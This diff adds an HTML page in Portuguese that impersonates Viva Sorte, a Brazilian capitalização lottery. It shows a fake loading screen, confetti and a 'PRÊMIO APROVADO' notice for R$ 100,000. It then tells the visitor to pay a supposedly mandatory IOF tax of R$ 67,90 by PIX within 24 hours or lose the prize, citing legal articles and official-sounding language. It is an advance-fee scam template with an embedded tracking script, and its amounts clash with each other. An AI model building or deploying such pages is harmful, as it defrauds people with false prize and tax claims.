@@ -1,0 +1,1627 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Prêmio Aprovado - Viva Sorte</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+
+<script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="0c79f95c-19ed-4f13-974a-48f8c1f6896f"
+>
+</script>
+
+    <style>
+        @font-face {
+            font-family: 'Futura-Book';
+            src: url('fonts/Futura-Book.eot');
+            src: url('fonts/Futura-Book.eot#iefix') format('embedded-opentype'),
+                url('fonts/Futura-Book.woff2') format('woff2'),
+                url('fonts/Futura-Book.woff') format('woff'),
+                url('fonts/Futura-Book.ttf') format('truetype'),
+                url('images/Futura-Book.svg#Futura-Book') format('svg');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        body {
+            font-family: 'Futura-Book', 'Inter', sans-serif !important;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* === ESTILOS DA TELA DE LOADING === */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #2f4eb5 0%, #1e3a8a 100%);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        #loadingScreen.hidden {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-logo-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin-bottom: 2rem;
+        }
+
+        .loading-logo {
+            width: 100px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10;
+            animation: pulse 2s infinite;
+        }
+
+        .loading-ring {
+            width: 160px;
+            height: 160px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .loading-ring circle {
+            fill: none;
+            stroke-width: 6;
+            stroke-linecap: round;
+        }
+
+        .loading-ring .ring-bg {
+            stroke: rgba(255, 255, 255, 0.2);
+        }
+
+        .loading-ring .ring-progress {
+            stroke: white;
+            stroke-dasharray: 283;
+            stroke-dashoffset: 283;
+            animation: loadingRotate 2s linear infinite;
+            transform-origin: 50% 50%;
+        }
+
+        .loading-content {
+            text-align: center;
+            color: white;
+        }
+
+        .loading-title {
+            font-size: 1.75rem;
+            font-weight: bold;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.5px;
+        }
+
+        .loading-message {
+            font-size: 1rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 0.25rem;
+        }
+
+        .loading-dot {
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+
+        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
+        .loading-dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.05); }
+        }
+
+        @keyframes loadingRotate {
+            0% { 
+                transform: rotate(0deg);
+                stroke-dashoffset: 283;
+            }
+            50% {
+                stroke-dashoffset: 70;
+            }
+            100% { 
+                transform: rotate(360deg);
+                stroke-dashoffset: 283;
+            }
+        }
+
+        @keyframes bounce {
+            0%, 80%, 100% { 
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            40% { 
+                transform: scale(1.2);
+                opacity: 1;
+            }
+        }
+
+        /* Adiciona uma barra superior no estilo do Viva Sorte */
+        .viva-topbar {
+            height: 5px;
+            background: linear-gradient(to right, #2f4eb5 70%, #3b82f6 30%);
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10000;
+        }
+        /* === FIM DOS ESTILOS DA TELA DE LOADING === */
+
+        /* === ESTILOS DA TELA DE CONFIRMAÇÃO DE BOLÃO === */
+        #confirmacaoBolao {
+            background: linear-gradient(135deg, #2f4eb5 0%, #1e3a8a 100%);
+            min-height: 100vh;
+            padding: 2rem 1rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        #confirmacaoBolao h1 {
+            font-size: 1.4rem;
+            color: white;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .container-principal-bolao {
+            height: auto;
+            margin: 0 auto;
+            margin-bottom: 1.6rem;
+            background-color: white;
+            width: 450px;
+            max-width: 100%;
+            color: black;
+            border-radius: 0.4rem;
+            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+            padding: 0;
+        }
+
+        .topo-container-bolao {
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+            width: 100%;
+            padding: 1rem 0;
+            border-radius: 0.4rem 0.4rem 0 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .topo-container-bolao img {
+            height: 24px;
+            width: auto;
+            object-fit: contain;
+            max-width: none;
+        }
+
+        .topo-container-bolao h1 {
+            color: white !important;
+            font-size: 1.2rem !important;
+            margin: 0;
+            margin-left: 0.4rem !important;
+        }
+
+        .container-principal-p-bolao {
+            padding: 1rem 0.4rem;
+        }
+
+        .container-principal-bolao h1 {
+            color: #2f4eb5;
+            font-size: 1.5rem;
+            margin: 0.4rem 0;
+            text-align: center;
+        }
+
+        .container-principal-bolao h2 {
+            color: #6b7280;
+            font-size: 1.1rem;
+            margin: 0.4rem 0;
+            width: 100%;
+            text-align: center;
+        }
+
+        .container-principal-bolao h3 {
+            color: #2f4eb5;
+            font-size: 1.3rem;
+            margin: 0.4rem 0;
+            text-align: center;
+            line-height: 1.8rem;
+        }
+
+        .line-bolao {
+            width: 100%;
+            margin: 0.8rem 0;
+            border-bottom: dashed #bebebe 1px;
+        }
+
+        .dezenas-bolao {
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            margin: 1rem 0;
+            gap: 0.3rem;
+        }
+
+        .dezenas-bolao span {
+            flex: 0 0 52px;
+            width: 52px;
+            height: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+            padding: 0.2rem 0 0 0;
+            border-radius: 6px;
+            color: white;
+            font-size: 0.9rem;
+            margin: 0.1rem;
+            line-height: 1;
+            box-shadow: 0 2px 4px rgba(47, 78, 181, 0.3);
+        }
+
+        .botoes-bolao {
+            margin: 0 auto;
+            width: 90%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 1.3rem;
+        }
+
+        .botoes-bolao button {
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+            color: white;
+            font-weight: 600;
+            width: 100%;
+            border: none;
+            padding: 0.8rem 1rem;
+            font-size: 1rem;
+            border-radius: 12px;
+            margin-bottom: 0.6rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(47, 78, 181, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .botoes-bolao button:hover {
+            background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(47, 78, 181, 0.4);
+        }
+
+        .btn-ver-mais-bolao {
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%) !important;
+            border: 2px solid #2f4eb5 !important;
+            color: #2f4eb5 !important;
+            width: auto !important;
+            padding: 8px 20px !important;
+            font-size: 0.9rem !important;
+            margin: 10px 0 !important;
+            border-radius: 8px !important;
+            text-transform: none !important;
+            letter-spacing: normal !important;
+            box-shadow: 0 2px 8px rgba(47, 78, 181, 0.2) !important;
+        }
+
+        .btn-ver-mais-bolao:hover {
+            background: linear-gradient(135deg, #e2e8f0 0%, #cbd5e1 100%) !important;
+            color: #1e3a8a !important;
+            border-color: #1e3a8a !important;
+        }
+
+        @media (max-width: 576px) {
+            .container-principal-bolao {
+                padding: 0 !important;
+            }
+            
+            .dezenas-bolao {
+                gap: 0.2rem;
+            }
+            
+            .dezenas-bolao span {
+                flex: 0 0 48px;
+                width: 48px;
+                height: 30px;
+                font-size: 0.8rem;
+                margin: 0.05rem;
+            }
+        }
+        /* === FIM DOS ESTILOS DA TELA DE CONFIRMAÇÃO === */
+
+        .header-oficial {
+            background: linear-gradient(135deg, #2f4eb5 0%, #1e3a8a 100%);
+            padding: 1rem 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        .logo-caixa {
+            height: 32px;
+        }
+
+        .container-main {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .card-premio {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+
+                 .header-sucesso {
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+             color: white;
+             padding: 2rem;
+             text-align: center;
+             position: relative;
+         }
+
+        .icon-sucesso {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+
+        .titulo-sucesso {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin: 0 0 0.5rem 0;
+            letter-spacing: 0.5px;
+        }
+
+        .subtitulo-sucesso {
+            font-size: 1rem;
+            margin: 0;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .conteudo-principal {
+            padding: 2rem;
+        }
+
+        .imagem-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto 2rem auto;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+        }
+
+        .imagem-premio {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 1024/335;
+            object-fit: contain;
+            display: block;
+            border-radius: 16px;
+            transition: transform 0.3s ease;
+        }
+
+        .imagem-premio:hover {
+            transform: scale(1.02);
+        }
+
+        .valor-container {
+            text-align: center;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid #dee2e6;
+        }
+
+        .valor-premio {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #28a745;
+            margin: 0;
+            line-height: 1;
+        }
+
+        .valor-descricao {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+
+        .numeros-container {
+            background: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .numeros-titulo {
+            font-size: 1.1rem;
+            color: #495057;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .numeros-grid {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+
+        .numero-ball {
+            width: 52px;
+            height: 32px;
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+            color: white;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 2px 8px rgba(47, 78, 181, 0.3);
+        }
+
+        .resultado-tipo {
+            text-align: center;
+            color: #059669;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .alert-procedimento {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .alert-icon {
+            color: #856404;
+            font-size: 1.2rem;
+            margin-right: 0.5rem;
+        }
+
+        .alert-titulo {
+            color: #856404;
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .info-iof {
+            background: #f8f9fa;
+            border-left: 4px solid #2f4eb5;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .info-titulo {
+            color: #2f4eb5;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .info-lista {
+            margin: 0;
+            padding-left: 1.2rem;
+        }
+
+        .info-lista li {
+            margin-bottom: 0.5rem;
+            color: #495057;
+        }
+
+        .tempo-limite {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .tempo-titulo {
+            font-weight: 600;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .cronometro-display {
+            font-size: 2rem;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            margin: 0.5rem 0;
+        }
+
+        .tempo-aviso {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .btn-pagamento {
+            background: linear-gradient(135deg, #2f4eb5 0%, #3b82f6 100%);
+            border: none;
+            color: white;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            width: 100%;
+            margin: 1.5rem 0;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            box-shadow: 0 4px 16px rgba(47, 78, 181, 0.3);
+        }
+
+        .btn-pagamento:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(47, 78, 181, 0.4);
+            background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 100%);
+        }
+
+        .seguranca-info {
+            background: #e8f5e8;
+            border: 1px solid #c3e6cb;
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .protocolo-info {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #6c757d;
+            margin-top: 0.5rem;
+        }
+
+        .rodape-viva {
+            background: linear-gradient(135deg, #1e3a8a 0%, #374151 100%);
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            margin-top: 3rem;
+        }
+
+        .aviso-legal {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.85rem;
+            color: #6c757d;
+            text-align: center;
+        }
+
+        .cards-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .card-info {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .card-info-icon {
+            color: #2f4eb5;
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .card-info-titulo {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #495057;
+        }
+
+        .card-info-texto {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .container-main {
+                margin: 1rem auto;
+                padding: 0 0.5rem;
+            }
+            
+            .conteudo-principal {
+                padding: 1.5rem;
+            }
+            
+            .valor-premio {
+                font-size: 2.2rem;
+            }
+            
+            .cronometro-display {
+                font-size: 1.5rem;
+            }
+            
+            .numero-ball {
+                width: 48px;
+                height: 30px;
+                font-size: 0.8rem;
+            }
+            
+            .numeros-grid {
+                gap: 0.3rem;
+            }
+
+            .imagem-container {
+                max-width: 480px;
+            }
+
+            .imagem-premio {
+                height: auto;
+            }
+
+            .loading-logo-container {
+                width: 120px;
+                height: 120px;
+            }
+
+            .loading-logo {
+                width: 96px;
+            }
+
+            .loading-ring {
+                width: 120px;
+                height: 120px;
+            }
+
+            .loading-title {
+                font-size: 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-sucesso {
+                padding: 1.5rem;
+            }
+            
+            .titulo-sucesso {
+                font-size: 1.5rem;
+            }
+            
+            .valor-premio {
+                font-size: 1.8rem;
+            }
+            
+            .conteudo-principal {
+                padding: 1rem;
+            }
+
+            .imagem-container {
+                max-width: 350px;
+            }
+
+            .imagem-premio {
+                height: auto;
+            }
+
+            .loading-logo-container {
+                width: 100px;
+                height: 100px;
+            }
+
+            .loading-logo {
+                width: 65px;
+            }
+
+            .loading-ring {
+                width: 100px;
+                height: 100px;
+            }
+
+            .loading-title {
+                font-size: 1.3rem;
+            }
+
+            .loading-message {
+                font-size: 0.9rem;
+            }
+        }
+        
+        .audio-whatsapp {
+    width: 100%;
+    max-width: 360px;
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+    margin: 20px auto;
+}
+
+.play-btn {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    border: none;
+    background: #2f4eb5;
+    cursor: pointer;
+    position: relative;
+}
+
+.play-btn::before {
+    content: "";
+    position: absolute;
+    left: 16px;
+    top: 12px;
+    width: 0;
+    height: 0;
+    border-left: 14px solid white;
+    border-top: 10px solid transparent;
+    border-bottom: 10px solid transparent;
+}
+
+.play-btn.pause::before {
+    content: "";
+    position: absolute;
+    left: 14px;
+    top: 12px;
+    width: 12px;
+    height: 18px;
+    background: white;
+    mask: none;
+    border-left: 4px solid white;
+    border-right: 4px solid white;
+    border-radius: 2px;
+}
+
+.audio-progress {
+    flex: 1;
+    background: #e5e7eb;
+    height: 4px;
+    border-radius: 4px;
+    overflow: hidden;
+}
+
+.progress-bar {
+    width: 0%;
+    height: 100%;
+    background: #2f4eb5;
+    border-radius: 4px;
+}
+
+.audio-time {
+    font-size: 0.85rem;
+    color: #4b5563;
+    min-width: 38px;
+    text-align: right;
+}
+
+    </style>
+</head>
+
+<body>
+    <!-- Barra Superior Viva Sorte -->
+    <div class="viva-topbar"></div>
+
+    <!-- Tela de Loading -->
+    <div id="loadingScreen">
+        <div class="loading-container">
+            <div class="loading-logo-container">
+                <!-- Logo com efeito de pulsação -->
+                <img src="images/logo.png" alt="Logo Viva Sorte" class="loading-logo">
+                
+                <!-- Anel de carregamento animado -->
+                                 <svg class="loading-ring" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                     <circle cx="50" cy="50" r="45" class="ring-bg"></circle>
+                     <circle cx="50" cy="50" r="45" class="ring-progress"></circle>
+                 </svg>
+            </div>
+            
+                         <div class="loading-content">
+                <h1 class="loading-title">Carregando seu título</h1>
+                 <p class="loading-message">Estamos preparando suas informações...</p>
+                
+                <!-- Indicador de pontos carregando -->
+                <div class="loading-dots">
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tela de Confirmação de Bolão -->
+    <div id="confirmacaoBolao" style="display: none;">
+        <h1>Confirme seu bolão selecionado:</h1>
+        <div class="container-principal-bolao">
+            <div class="topo-container-bolao">
+                <img src="images/logo.png" alt="" style="height: 24px; width: auto; object-fit: contain;">
+                <h1>Viva Sorte Especial</h1>
+            </div>
+            <div class="container-principal-p-bolao">
+                <h1>R$ 50.000,00</h1>
+                <h2>Título de Capitalização Especial</h2>
+                <div class="line-bolao"></div>
+                <h2 id="sorteioData">Sorteio: <b>28/12/2024</b></h2>
+                <h2 id="composicaoBolao">Composição: <b>--</b></h2>
+                <div class="line-bolao"></div>
+                
+                <!-- Container para as dezenas que será preenchido dinamicamente -->
+                <div id="dezenasBolaoContainer"></div>
+                
+                <!-- Botão Ver Mais -->
+                <div style="text-align: center;">
+                    <button id="verMaisBolaoBtn" onclick="toggleJogosBolao()" class="btn-ver-mais-bolao" style="display: none;">Ver Mais</button>
+                </div>
+                
+                <!-- Container para jogos ocultos -->
+                <div id="maisJogosBolao" style="display: none;"></div>
+                
+                <div class="botoes-bolao">
+                    <button onclick="confirmarBolao()">
+                        <i class="bi bi-check-circle-fill"></i> CONFIRMAR MEU TÍTULO
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Conteúdo Principal do Upsell -->
+    <div id="telaUpsellOriginal" style="display: none;">
+    
+    <!-- Header Oficial Viva Sorte -->
+    <div class="header-oficial">
+        <div class="container">
+            <div class="d-flex align-items-center justify-content-between">
+                <img src="images/logo.png" alt="Viva Sorte" class="logo-caixa" style="height: 32px; width: auto; object-fit: contain;">
+                <div class="text-white">
+                  
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-main">
+        <!-- Card Principal do Prêmio -->
+        <div class="card-premio">
+            <!-- Header de Sucesso -->
+            <div class="header-sucesso">
+                <div class="icon-sucesso">
+                    <i class="bi bi-check-circle-fill text-white" style="font-size: 1.5rem;"></i>
+                </div>
+                <h1 class="titulo-sucesso">PRÊMIO APROVADO</h1>
+                <p class="subtitulo-sucesso">Sua participação foi contemplada no sorteio oficial</p>
+            </div>
+
+            <!-- Conteúdo Principal -->
+            <div class="conteudo-principal">
+                <!-- Imagem de Premiação -->
+                <div class="imagem-container">
+                    <img src="images/imagem.webp" alt="Prêmio Viva Sorte" class="imagem-premio">
+                </div>
+
+                <!-- Valor do Prêmio -->
+                <div class="valor-container">
+                    <div class="valor-premio">R$ 100.000,00</div>
+                    <div class="valor-descricao">Prêmio do Viva Sorte - Título de Capitalização</div>
+                </div>
+
+                <!-- Procedimento Obrigatório -->
+                <div class="alert-procedimento">
+                    <div class="alert-titulo">
+                        <i class="bi bi-exclamation-triangle alert-icon"></i>
+                        PROCEDIMENTO OBRIGATÓRIO PARA LIBERAÇÃO
+                    </div>
+                    <p class="mb-2">
+                        <strong>Para a liberação do seu prêmio, é necessário o recolhimento do IOF (Imposto sobre Operações Financeiras)</strong> 
+                        conforme estabelecido pela Lei Federal nº 5.143/66 e regulamentação do Banco Central do Brasil.
+                    </p>
+                    <p class="mb-0">
+                        <small>Este procedimento é obrigatório para todos os prêmios de títulos de capitalização superiores a R$ 1.000,00 e deve ser realizado antes da transferência dos valores.</small>
+                    </p>
+                </div>
+
+                <!-- Informações sobre IOF -->
+                <div class="info-iof">
+                    <div class="info-titulo">
+                        <i class="bi bi-info-circle"></i>
+                        Informações sobre o IOF
+                    </div>
+                    <ul class="info-lista">
+                        <li>Taxa regulamentada pelo Banco Central do Brasil</li>
+                        <li>Percentual aplicado: 2,5% sobre o valor bruto do prêmio</li>
+                                                 <li>Valor do IOF a recolher: <strong>R$ 67,90</strong></li>
+                        <li>Modalidade de pagamento: PIX (processamento instantâneo)</li>
+                        <li>Prazo para recolhimento: 24 horas após aprovação</li>
+                    </ul>
+                </div>
+
+                
+
+
+
+
+
+                                 <!-- Botão de Pagamento -->
+                 <button class="btn-pagamento" onclick="processarPagamento(3990)">
+                     <i class="bi bi-credit-card"></i>
+                     RECOLHER IOF - R$ 67,90
+                 </button>
+
+                <!-- Aviso Legal -->
+                <div class="aviso-legal">
+                    <i class="bi bi-exclamation-triangle text-warning"></i>
+                    O não recolhimento do IOF no prazo estabelecido acarretará no cancelamento automático do prêmio, 
+                    conforme artigo 15º do regulamento dos Títulos de Capitalização Viva Sorte.
+                </div>
+
+                <!-- Cards Informativos -->
+                <div class="cards-info">
+                    <div class="card-info">
+                        <div class="card-info-icon">
+                            <i class="bi bi-lightning-charge"></i>
+                        </div>
+                        <div class="card-info-titulo">Processamento</div>
+                        <div class="card-info-texto">Liberação imediata após confirmação do pagamento</div>
+                    </div>
+                    <div class="card-info">
+                        <div class="card-info-icon">
+                            <i class="bi bi-bank"></i>
+                        </div>
+                        <div class="card-info-titulo">Transferência</div>
+                        <div class="card-info-texto">Depósito direto em sua conta bancária</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rodapé Oficial -->
+    <div class="rodape-viva">
+        <div class="container text-center">
+            <p class="mb-2"><strong>VIVA SORTE</strong></p>
+            <p class="mb-1">Títulos de Capitalização - Portal Oficial de Liberação de Prêmios</p>
+            <small>© 2024 - Todos os direitos reservados</small>
+        </div>
+    </div>
+
+    <!-- Modal de Loading -->
+    <div class="modal fade" id="loadingModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-body text-center p-5">
+                    <div class="spinner-border text-primary mb-3" role="status" style="width: 3rem; height: 3rem;">
+                        <span class="visually-hidden">Carregando...</span>
+                    </div>
+                    <h5 class="modal-title" id="loadingModalLabel">Processando Pagamento</h5>
+                    <p class="mt-2">Estamos preparando seu pagamento. Por favor, aguarde...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    </div> <!-- Fim do telaUpsellOriginal -->
+
+    <!-- Scripts -->
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/confetti.browser.min.js"></script>
+    
+    <script>
+        // Função para criar confetes
+        function iniciarConfetes() {
+            const duration = 5 * 1000; // 5 segundos
+            const animationEnd = Date.now() + duration;
+            const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
+
+            function randomInRange(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+
+            const interval = setInterval(function() {
+                const timeLeft = animationEnd - Date.now();
+
+                if (timeLeft <= 0) {
+                    return clearInterval(interval);
+                }
+
+                const particleCount = 50 * (timeLeft / duration);
+
+                // Confetes azuis (cores do Viva Sorte)
+                confetti(Object.assign({}, defaults, {
+                    particleCount,
+                    origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 },
+                    colors: ['#2f4eb5', '#3b82f6', '#1e3a8a', '#60a5fa', '#2563eb']
+                }));
+                
+                // Confetes do outro lado
+                confetti(Object.assign({}, defaults, {
+                    particleCount,
+                    origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 },
+                    colors: ['#2f4eb5', '#3b82f6', '#1e3a8a', '#60a5fa', '#2563eb']
+                }));
+            }, 250);
+        }
+
+
+
+        // Controlar tela de loading e verificar parâmetros
+        document.addEventListener('DOMContentLoaded', function() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const confirmacaoBolao = document.getElementById('confirmacaoBolao');
+            const telaUpsellOriginal = document.getElementById('telaUpsellOriginal');
+            
+            // Verificar parâmetros na URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const bolaoId = urlParams.get('titulo'); // Para títulos específicos do upsell
+            const loteId = urlParams.get('lote_id'); // Para lotes vindos da página principal
+            
+            // Preparar a tela que será exibida após o loading
+            if (bolaoId) {
+                // Se há parâmetro titulo, preparar tela de confirmação (títulos do upsell)
+                carregarDadosBolao(bolaoId);
+                document.body.style.overflow = 'hidden';
+            } else if (loteId) {
+                // Se há parâmetro lote_id, preparar tela de confirmação (lotes da página principal)
+                carregarDadosLote(loteId);
+                document.body.style.overflow = 'hidden';
+            }
+            
+            // Esconder a tela de loading após 4 segundos
+            setTimeout(function() {
+                loadingScreen.classList.add('hidden');
+                
+                // Após a animação de saída, mostrar a tela correta imediatamente
+                setTimeout(function() {
+                    if (bolaoId || loteId) {
+                        // Mostrar tela de confirmação instantaneamente
+                        confirmacaoBolao.style.display = 'flex';
+                    } else {
+                        // Mostrar tela normal e iniciar confetes
+                        telaUpsellOriginal.style.display = 'block';
+                        document.body.style.overflow = 'auto';
+                        iniciarConfetes();
+                    }
+                }, 50);
+            }, 4000);
+
+        });
+
+        // Função para carregar dados do título baseado no ID
+        function carregarDadosBolao(bolaoId) {
+                            const titulos = {
+                '1': {
+                    composicao: '10 títulos com 10 números',
+                    jogosVisiveis: [
+                        ['03', '08', '17', '22', '29', '36', '42', '51', '67', '78'],
+                        ['01', '09', '15', '21', '33', '40', '48', '56', '62', '79']
+                    ],
+                    jogosOcultos: [
+                        ['04', '11', '18', '25', '30', '37', '45', '53', '69', '75'],
+                        ['06', '13', '19', '24', '34', '43', '50', '58', '66', '73'],
+                        ['02', '10', '20', '27', '31', '38', '46', '54', '63', '77'],
+                        ['05', '12', '16', '23', '32', '41', '49', '59', '68', '76'],
+                        ['07', '14', '26', '28', '35', '39', '44', '57', '64', '70'],
+                        ['01', '08', '17', '26', '33', '47', '55', '60', '71', '80'],
+                        ['03', '09', '18', '22', '30', '36', '52', '61', '65', '74'],
+                        ['06', '12', '19', '25', '31', '40', '51', '60', '72', '78']
+                    ]
+                },
+                '2': {
+                    composicao: '20 títulos com 13 números',
+                    jogosVisiveis: [
+                        ['05', '08', '11', '16', '22', '28', '35', '40', '49', '53', '59', '68', '75'],
+                        ['02', '10', '15', '21', '25', '33', '37', '43', '50', '58', '63', '69', '77']
+                    ],
